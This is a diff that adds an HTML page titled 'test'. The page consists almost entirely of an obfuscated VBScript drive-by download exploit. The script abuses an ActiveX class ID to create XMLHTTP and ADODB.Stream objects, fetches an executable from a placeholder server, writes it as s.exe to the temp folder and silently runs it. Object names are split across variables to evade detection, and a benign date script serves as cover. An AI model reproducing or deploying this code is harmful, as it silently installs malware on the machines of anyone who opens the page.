@@ -1,0 +1,57 @@
+&lt;HTML&gt;
+&lt;HEAD&gt;
+&lt;**** http-eqiv=&quot;content-type&quot; content=&quot;text/html;charset=gb2312&quot;&gt;
+&lt;title&gt;test&lt;/title&gt;
+&lt;textarea style=&quot;display:none&quot; id=lshdic200Xpage rows=&quot;1&quot; 
+cols=&quot;20&quot;&gt;&lt;/textarea&gt;&lt;script 
+language=vbs&gt;document.write(strreverse(lshdic200Xpage.value))&lt;/script&gt;
+&lt;script
+
+language=&quot;VBScript&quot;&gt;
+  on error resume next
+  xx=&quot;object&quot;
+  xxx=&quot;classid&quot;
+  xxxx=&quot;clsid:BD96C556-65A3-11D0-983A-00C04FC29E36&quot;
+  xxxxx=&quot;Microsoft.XMLHTTP&quot;
+  xxxxxx=&quot;GET&quot;
+  xxxxxxx=&quot;Scripting.FileSystemObject&quot;
+  xxxxxxxx=&quot;Shell.Application&quot;
+  dl = &quot;http://Path-Server&quot;
+  Set df = document.createElement(xx)
+  df.setAttribute xxx, xxxx
+  str=xxxxx
+  Set a = df.CreateObject(str,&quot;&quot;)
+  a1=&quot;Ado&quot;
+  a2=&quot;db.&quot;
+  a3=&quot;Str&quot;
+  a4=&quot;eam&quot;
+  str1=a1&amp;a2&amp;a3&amp;a4
+  str5=str1
+  set S = df.createobject(str5,&quot;&quot;)
+  S.type = 1
+  str6=xxxxxx
+  a.Open str6, dl, 0
+  a.Send
+  fname1=&quot;s.exe&quot;
+  set F = df.createobject(xxxxxxx,&quot;&quot;)
+  set tmp = F.GetSpecialFolder(2)
+  fname1= F.BuildPath(tmp,fname1)
+  S.open
+  S.write a.responseBody
+  S.savetofile fname1,2
+  S.close
+  set Q = df.createobject(xxxxxxxx,&quot;&quot;)
+  str1=a1&amp;a2&amp;a3&amp;a4
+  Q.ShellExecute fname1,&quot;&quot;,&quot;&quot;,&quot;open&quot;,0
+  &lt;/script&gt;
+&lt;script type=&quot;text/jscript&quot;&gt;
+function init() {
+document.write(Date());
+
+}
+window.onload = init;
+&lt;/script&gt;
+&lt;/HEAD&gt;
+&lt;BODY&gt;
+&lt;/BODY&gt;
+&lt;/HTML&gt; 
